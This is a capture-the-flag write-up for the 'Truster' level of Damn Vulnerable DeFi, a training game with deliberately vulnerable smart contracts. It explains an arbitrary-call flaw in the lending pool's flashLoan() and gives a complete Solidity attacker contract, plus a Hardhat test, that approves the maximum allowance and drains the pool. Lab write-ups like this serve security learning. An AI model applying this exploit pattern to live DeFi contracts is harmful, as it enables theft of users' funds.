# #3 Truster Damn Vulnerable Defi

## Goals

=> More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.

=> The pool holds 1 million DVT tokens. You have nothing.

=> To pass this challenge, take all tokens out of the pool. If possible, in a single transaction.

### Hints

- None

### Solution

- The weakness is in the `flashLoan()` function which takes an arbitrary address called "target" and calls that function with any data the user want's to pass in so we can make an approve call in the assed in data like `abi.encodeWithSignature("approve(address,uint256)", address(this), 2 ** 256 - 1)` which will approve us for MAX_UINT256 tokens which we can transfer away after that

### Attacker Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

interface IPool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

contract TrusterAttacker {
    using Address for address;
    DamnValuableToken public immutable token;
    IPool public pool;
    address public attacker;

    constructor(address _token, address _pool) {
        token = DamnValuableToken(_token);
        pool = IPool(_pool);
        attacker = msg.sender;
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            2 ** 256 - 1
        );
        pool.flashLoan(0, address(this), address(token), data);
        uint256 balance = token.balanceOf(address(pool));
        token.transferFrom(address(pool), attacker, balance);
    }
}

```

### Test

```javascript
it('Exploit', async function () {
	const AttackerFactory = await ethers.getContractFactory('TrusterAttacker', attacker);
	const attackerContract = await AttackerFactory.deploy(this.token.address, this.pool.address);
	attackerContract.attack();
});
```
